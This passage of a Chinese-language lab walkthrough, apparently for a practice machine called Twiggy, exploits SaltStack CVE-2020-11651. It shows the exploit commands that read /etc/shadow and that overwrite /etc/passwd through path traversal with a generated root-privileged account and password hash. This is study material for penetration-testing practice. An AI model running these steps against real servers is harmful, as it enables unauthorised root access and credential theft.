看到貌似可以利用漏洞进行RCE，我们使用第二个链接的RCE，根据链接提示进行poc使用

```
python3 -m venv .venv
/home/zkpc/Documents/PG/Linux/1.Twiggy/CVE-2020-11651-poc/.venv/bin/python -m pip install salt
/home/zkpc/Documents/PG/Linux/1.Twiggy/CVE-2020-11651-poc/.venv/bin/python exploit.py --master 192.168.227.60 -r /etc/shadow
```

尝试该脚本后，执行命令和反弹shell均存在报错，但可以读取文件，我们优先读取/etc/password和shadow文件

![image-20241116151426477](https://s2.loli.net/2024/11/16/5CKEZlacAPR89Jr.png)

我们可以看到root存在一个密码哈希，复制后进行破解，但尝试过后发现无法破解，可能是密码复杂度较高，我们既然能够查看shadow文件，那么我们的权限够高，尝试针对password文件进行替换，我们优先在本地创建一个passwd文件，新增一个root2的用户，具备root权限（https://www.haxi.cc/archives/%E6%89%8B%E5%8A%A8%E7%94%9F%E6%88%90Linux%E5%AF%86%E7%A0%81-etc-shadow.html）

```
openssl passwd -1 '123456'
root:$1$j7e2Z0Ld$fUHvVg7U8w6ZxwQbXObGo0:0:0:root:/root:/bin/bash
/home/zkpc/Documents/PG/Linux/1.Twiggy/CVE-2020-11651-poc/.venv/bin/python exploit.py --master 192.168.227.62 --upload-src passwd --upload-dest ../../../../../etc/passwd
```
